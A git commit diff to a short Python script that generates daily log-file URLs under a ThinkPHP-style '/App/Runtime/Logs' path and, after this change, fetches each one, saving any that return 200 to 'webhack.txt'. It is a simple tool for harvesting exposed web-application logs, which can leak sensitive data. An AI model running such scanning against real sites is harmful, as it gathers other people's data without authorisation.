ff5c83474f80d09281a9961f4e40fe8ef7628718
summer <108825705+whoamizx@users.noreply.github.com>
2024-07-25 22:46:53 +0800

    Update fing_gold_in_log.py

--- fing_gold_in_log.py
+++ fing_gold_in_log.py
@@ -1,12 +1,9 @@
 import requests
-
-# url="http://www.webhack123.com/App/Runtime/Logs/18_07_02.log"
-
-url="http://www.webhack123.com/App/Runtime/Logs"
+url="http://www.test.com/App/Runtime/Logs"
 def addurls(url,year):
     urls=[]
     for i in range(1,13):
-        for j in range(1,32):
+        for j in range(1,32): 
             if i<10:
                 if j<10:
                     urls.append(url+"/%s_0%s_0%s.log"%(year,i,j))
@@ -17,7 +14,12 @@ def addurls(url,year):
                     urls.append(url+"/%s_%s_0%s.log"%(year,i,j))
                 else:
                     urls.append(url+"/%s_%s_%s.log"%(year,i,j))
-    for url in urls:
-        print(url)
+    return urls
 
-addurls(url,19)
+urls=addurls(url,20)
+for testurl in urls:
+    r=requests.get(testurl)
+    if r.status_code==200:
+        print(testurl)
+        with open("webhack.txt",'a',encoding='utf-8') as f:
+            f.write(r.text)
